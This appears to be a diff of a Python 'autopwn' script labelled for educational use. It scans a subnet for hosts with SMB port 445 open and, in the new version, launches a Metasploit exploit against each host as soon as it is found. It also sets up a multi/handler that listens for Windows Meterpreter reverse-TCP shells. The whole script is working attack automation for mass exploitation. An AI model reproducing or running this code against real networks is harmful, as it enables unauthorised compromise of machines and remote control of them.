@@ -2,7 +2,10 @@
 
 ### Created by @jgaudard
 ### For educational use only
-### Version 1.0
+### Version 2.0
+### Version Notes:
+### Moved autopwn() module into scanner module, allows for pwnage when a new target is found.
+### Host interation from handler() using msfconsole with resource file instead of msfcli.
 
 
 
@@ -25,7 +28,7 @@ netStop=254
 def scanner(net, netStart, netStop):
 	print('running scanner')
         for octect in range(netStart,netStop):
-                test = net + '.' + str(octect)
+                #test = net + '.' + str(octect)
                 try:
                                
 			network = net + '.' + str(octect)
@@ -33,6 +36,11 @@ def scanner(net, netStart, netStop):
 			s.settimeout(1)
 			s.connect((network, 445))
 			targets.append(network)
+			if(len(targets) != 0):
+				for target in targets:
+					### the autopwn
+					subprocess.Popen(shlex.split('msfcli {0} PAYLOAD={1} RHOST={2} LHOST={3} LPORT={4} DisablePayloadHandler=true E'.format(exploit, payload, target, lhost, lport)))
+					targets.pop(0)
 			s.close
 		except: continue
  
@@ -44,27 +52,32 @@ def msfhandler():
         handlerfile.write("use exploit/multi/handler\n")
         handlerfile.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
         handlerfile.write("set LHOST {0}\n".format(lhost))
+        handlerfile.write("set LPORT {0}\n".format(lport))
         handlerfile.write("set ExitOnSession false\n")
         handlerfile.write("exploit -j -z\n")
         handlerfile.close()
         
         msfstart = subprocess.Popen(shlex.split('service postgresql start ; service metasploit start'))
+        time.sleep(30)
         handler = subprocess.Popen(shlex.split('gnome-terminal -x msfconsole -r handler.rc'))
-        time.sleep(60)
+        time.sleep(30)
         os.remove('handler.rc')
- 
-### the autopwn
+
+
+###moved into scanner module to pwn as targets are found
+'''
 def autopwn(targets):
 	print('starting to autopwn targets: {0}'.format(targets))
 	for target in targets:
 		subprocess.Popen(shlex.split('msfcli {0} PAYLOAD={1} RHOST={2} LHOST={3} LPORT={4} DisablePayloadHandler=true E'.format(exploit, payload, target, lhost, lport)))
 	del targets[:]  ### Deletes all targets after autopwned
+'''
 	
 
 
 msfhandler()
 scanner(net, netStart, netStop)
-autopwn(targets)
+
 
 ### Examples ###
 ### Use multiple scanner and autopwn modules to scan and pwn more!
